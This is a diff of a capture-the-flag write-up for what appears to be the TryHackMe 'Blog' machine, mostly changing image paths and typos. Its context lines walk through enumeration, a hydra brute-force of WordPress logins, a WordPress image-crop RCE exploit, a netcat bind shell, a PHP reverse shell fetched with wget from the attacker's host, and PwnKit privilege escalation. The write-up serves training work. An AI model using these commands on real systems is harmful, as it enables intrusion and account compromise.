@@ -4,7 +4,7 @@
 
 
 ---
-![Pasted image 20240926172149.png|200](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926172149.png)
+![Pasted image 20240926172149.png|200](/img/user/attachments/Pasted%20image%2020240926172149.png)
 
 
 > [!info] Description
@@ -16,7 +16,7 @@
 
 
 ---
-# Active reconnaisance
+# Active reconnaissance
 ## Enum ports and services
 Run en general scan
 `sudo nmap 10.10.208.110 -n -Pn -sS --open --min-rate 5000 -vvv -p-`
@@ -29,7 +29,7 @@ PORT    STATE SERVICE      REASON
 ```
 
 ---
-# Vuln analisis
+# Vuln analysis
 Run a focused scan
 `sudo nmap 10.10.208.110 -sCV -p 22,80,139,445`
 ## Port 22
@@ -71,7 +71,7 @@ Host script results:
 ```
 ### Enum
 From smbclient
-![Pasted image 20240924102211.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924102211.png)
+![Pasted image 20240924102211.png](/img/user/attachments/Pasted%20image%2020240924102211.png)
 
 From enum4linux
 Known Usernames .. **administrator, guest, krbtgt, domain admins, root, bin, none**
@@ -107,7 +107,7 @@ Known Usernames .. **administrator, guest, krbtgt, domain admins, root, bin, non
      [+] Forced Log off Time: 37 days 6 hours 21 minutes
 ```
 
-[+] Retieved partial password policy with rpcclient:
+[+] Retrieved partial password policy with rpcclient:
  Password Complexity: Disabled
  Minimum Password Length: 5
 
@@ -120,13 +120,13 @@ S-1-5-32-544 BUILTIN **Administrators** (Local Group)
   [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
  S-1-22-1-1000 Unix User **bjoel** (Local User)
  S-1-22-1-1001 Unix User **smb** (Local User)
-### Conecting
+### Connecting
 As we can read to `BillySMB` resource we'll connect to it.
 ```shell
 smbclient //10.10.179.26/BillySMB -N
 ```
 Exec `dir` to list files
-![Pasted image 20240924110931.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924110931.png)
+![Pasted image 20240924110931.png|500](/img/user/attachments/Pasted%20image%2020240924110931.png)
 To download all
 ```shell
 prompt
@@ -136,7 +136,7 @@ We have:
 An image
 A piece if a video (Taylor Swift - I Knew You Were Trouble)
 A link of a youtube video in a qrcode (Billy Joel - We Didn't Start the Fire (Official HD Video)).
-![Pasted image 20240924111223.png|300](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924111223.png)
+![Pasted image 20240924111223.png|300](/img/user/attachments/Pasted%20image%2020240924111223.png)
 Extract some information like the song names and the singer
 ## Port 80
 **Apache httpd 2.4.29** ((Ubuntu))
@@ -156,10 +156,10 @@ Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 sudo nano /etc/hosts
 ```
 And add
-![Pasted image 20240923190019.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240923190019.png)
-![Pasted image 20240923190145.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240923190145.png)
+![Pasted image 20240923190019.png|400](/img/user/attachments/Pasted%20image%2020240923190019.png)
+![Pasted image 20240923190145.png|500](/img/user/attachments/Pasted%20image%2020240923190145.png)
 ### Robots.txt
-![Pasted image 20240924151003.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924151003.png)
+![Pasted image 20240924151003.png](/img/user/attachments/Pasted%20image%2020240924151003.png)
 ### Theme
 After executing `wpscan ` 
 `wpscan --url http://blog.thm:80`
@@ -173,18 +173,18 @@ http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 
 ### wp-admin admin-ajax php
 http://blog.thm/wp-admin/admin-ajax.php
-![Pasted image 20240924151247.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924151247.png)
+![Pasted image 20240924151247.png|400](/img/user/attachments/Pasted%20image%2020240924151247.png)
 
 ### Uploads
 From nikto scan we know uploads directory
 http://blog.thm/wp-content/uploads/
-![Pasted image 20240924151430.png|300](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924151430.png)
+![Pasted image 20240924151430.png|300](/img/user/attachments/Pasted%20image%2020240924151430.png)
 
 ### wp-admin -> wp-login
 Tring to connect `wp-admin` we are redirect to `wp-login`
-![Pasted image 20240924151208.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924151208.png)
+![Pasted image 20240924151208.png|500](/img/user/attachments/Pasted%20image%2020240924151208.png)
 After a manual test of the few words obtained from the enumetarion we know that the users `bjoel` and `kwheel` exist
-![Pasted image 20240924195239.png|200](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240924195239.png)
+![Pasted image 20240924195239.png|200](/img/user/attachments/Pasted%20image%2020240924195239.png)
 ### wp-includes
 # Exploitation
 ## CVE-2023-48795 (Fail)
@@ -205,7 +205,7 @@ With bjoel we have nothing but with `kwheel` we found the password
 ```shell
 hydra -f -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.130.200 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -vV -t 50
 ```
-![Pasted image 20240925194105.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240925194105.png)
+![Pasted image 20240925194105.png](/img/user/attachments/Pasted%20image%2020240925194105.png)
 ## CVE-2019-8943 CVE-2019-8942
 
 > [!cite] NIST CVE-2019-8943
@@ -217,7 +217,7 @@ hydra -f -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.130.200 http-post-f
 In the research of vulnerabilities we found this
 https://github.com/hadrian368
 This is just an example image containing the php code on the metadata
-![Pasted image 20240926112923.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926112923.png)
+![Pasted image 20240926112923.png|400](/img/user/attachments/Pasted%20image%2020240926112923.png)
 ### Executing the exploit
 Clone the repo and execute the exploit
 ```shell
@@ -225,19 +225,19 @@ git clone https://github.com/hadrian3689/wordpress_cropimage
 cd wordpress_cropimage
 python3 wp_rce.py -t http://blog.thm/ -u kwheel -p xxxxx -m twentytwenty
 ```
-![Pasted image 20240926113743.png|600](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926113743.png)
-We can run commands on the system [[Pentesting Web/RCE\|RCE]]. We have to go the browser or BurpSuite and run `http://blog.thm/rse.php?0=id`
+![Pasted image 20240926113743.png|600](/img/user/attachments/Pasted%20image%2020240926113743.png)
+We can run commands on the system [[RCE\|RCE]]. We have to go the browser or BurpSuite and run `http://blog.thm/rse.php?0=id`
 We don't have a output readable.
 ### Testing RCE
-I test if the [[Pentesting Web/RCE\|RCE]] is working.
+I test if the [[RCE\|RCE]] is working.
 On the attacker machine I set an `icmp` listener using `tcpdump`.
 ```shell
 sudo tcpdump ip proto \\icmp -i tun0
 ```
-![Pasted image 20240926114744.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926114744.png)
+![Pasted image 20240926114744.png|500](/img/user/attachments/Pasted%20image%2020240926114744.png)
 On the victim machine, to send a ping (just 2 packets) to my machine, run `http://blog.thm/rse.php?0=ping 10.6.2.59 -c 2/` but to avoid problems the url encoded 
 `http://blog.thm/rse.php?0=ping+10.6.2.59+-c+2/`
-![Pasted image 20240926115124.png|500](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926115124.png)
+![Pasted image 20240926115124.png|500](/img/user/attachments/Pasted%20image%2020240926115124.png)
 Works, we effectively are executing commands on the system.
 ### Bind shell
 After try some revershell with negative results, I decided execute an bind shell and works.
@@ -250,7 +250,7 @@ On the attacker machine, connect it.
 ```shell
 nc 10.10.43.165 4949
 ```
-![Pasted image 20240926115820.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926115820.png)
+![Pasted image 20240926115820.png|400](/img/user/attachments/Pasted%20image%2020240926115820.png)
 ### Reverse shell php
 We have a shell, now, to get a better revershell I upload a php revershell to the system `rev_shell_1.php`.
 We have the file on our system and run a python server
@@ -263,13 +263,13 @@ On the victim shell
 wget http://10.6.2.59:4545/rev_shell_1.php
 ```
 
-Start the revershell listener on the attaccker machine
+Start the revershell listener on the attacker machine
 ```shell
 rlwrap nc -lnvp 5151
 ```
 Now go to the url `http://blog.thm/rev_shell_1.php/`
 And we have a revershell
-![Pasted image 20240926120521.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926120521.png)
+![Pasted image 20240926120521.png|400](/img/user/attachments/Pasted%20image%2020240926120521.png)
 
 ---
 # Privilege Escalation
@@ -318,20 +318,20 @@ python3 CVE-2021-4034.py
 </div></div>
 
 We are root
-![Pasted image 20240926170025.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926170025.png)
+![Pasted image 20240926170025.png|400](/img/user/attachments/Pasted%20image%2020240926170025.png)
 
 Searching the user flag
 ```shell
 find / -type f -iname user.txt
 ```
-![Pasted image 20240926171656.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926171656.png)
+![Pasted image 20240926171656.png|400](/img/user/attachments/Pasted%20image%2020240926171656.png)
 
 And finally  the root flag
 Searching the user flag
 ```shell
 find / -type f -iname root.txt
 ```
-![Pasted image 20240926171935.png|400](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240926171935.png)
+![Pasted image 20240926171935.png|400](/img/user/attachments/Pasted%20image%2020240926171935.png)
 
 
 ---
